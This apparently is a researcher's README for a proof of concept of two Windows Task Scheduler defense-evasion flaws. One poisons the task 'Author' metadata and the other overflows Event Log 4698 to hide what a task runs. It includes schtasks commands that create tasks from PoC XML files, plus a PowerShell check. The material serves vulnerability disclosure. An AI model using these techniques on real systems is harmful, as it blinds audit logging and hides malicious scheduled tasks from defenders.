# Task Scheduler Logs Poisoning & Tampering
By [Ruben Enkaoua](https://x.com/rubenlabs) and [Cymulate](https://cymulate.com/)
<br>
<br>
[Original Blog: Task Scheduler New Vulnerabilities](https://cymulate.com/blog/task-scheduler-new-vulnerabilities-for-schtasks-exe/)
<br>
<br>

#### Description
<br>
Two new Defense Evasion techniques have been discovered.<br><br>
The first vulnerability is affecting the Task metadatas and the Event Log 4698 "Task Created", allowing an attacker to create a task based on an XML file and poison the "Author" entry to arbitrary data.<br>
The second vulnerability allows to leverage an unlimited allocated buffer in "Author" task metadata, which is handled further by the Windows Event Log, overwriting the whole log description.
<br>
<br>

#### Requirements
<br>

- Batch Logon rights on the Task Principal for the task to run (Otherwise the metadata / event log is poisoned / overwritten but the task won't run)
- The password of the task principal, if the user creating the task is not admin or doesn't have SeImpersonate privileges
<br>

#### Command
<br>

> Task Poisoning (Metadata / Event Log)
```bash
# Run the script to check if the INJECTED-DATA author name has been set in the task description
schtasks /create /tn poc /xml poc-poisoning.xml /ru <username> /rp <password> /f

# Check if the data has been injected by querying the task. If the author name is INJECTED-DATA the target is vulnerable
schtasks /query /tn poc /xml | findstr /i author
```
<br>

> Task Event Log Overflow
```bash
# Run the script to check if the +3500 bytes payload has been injected in the 4698 Event Log
# If the Log Type is not activated on your machine and you still want to test it, activate it in:
# Local Security Policy -> Advanced Audit Policy Configuration -> System Audit Policies - Local Group Policy Object -> Object Access -> Audit Other Object Access Events -> Select Success
schtasks /create /tn poc /xml poc-overflow.xml /ru <username> /rp <password> /f
```
<br>

> Log Check
```bash
# Check the task log by running the following powershell command. If the <RegistrationInfo> tag is containing a 3500 bytes buffer but not the command executed and the arguments, the target is vulnerable.
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} | Where-Object { $_.Message -like '*poc*' } |  Select-Object -First 1 | Format-List TimeCreated, Message
```
<br>

#### Notes
<br>
This code is for educational and research purposes only.<br>
The author takes no responsibility for any misuse of this code.
